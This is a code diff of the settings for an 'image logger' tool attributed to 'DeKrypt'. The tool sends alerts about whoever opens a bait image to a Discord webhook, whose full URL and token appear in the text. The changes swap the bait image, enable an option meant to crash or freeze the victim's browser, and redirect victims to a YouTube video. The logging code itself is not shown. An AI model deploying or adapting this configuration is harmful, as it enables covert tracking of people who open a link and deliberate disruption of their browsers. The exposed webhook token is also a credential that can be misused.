@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1078061211196850216/JSYVdMkqB0KxSNuMnWVfLHo7ZHeDRFfBRvrdnyJbYHZTjD3AjMFclXVfKsuH4Vq9fp2v",
-    "image": "https://i.imgur.com/PBAHdEy.png", # You can also have a custom image by using a URL argument
+    "image": "https://i.imgur.com/IsJ84a4.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,7 +22,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
@@ -35,8 +35,8 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
@@ -48,8 +48,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://www.youtube.com/watch?v=o-YBDTqX_ZU&ab_channel=MusRest" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
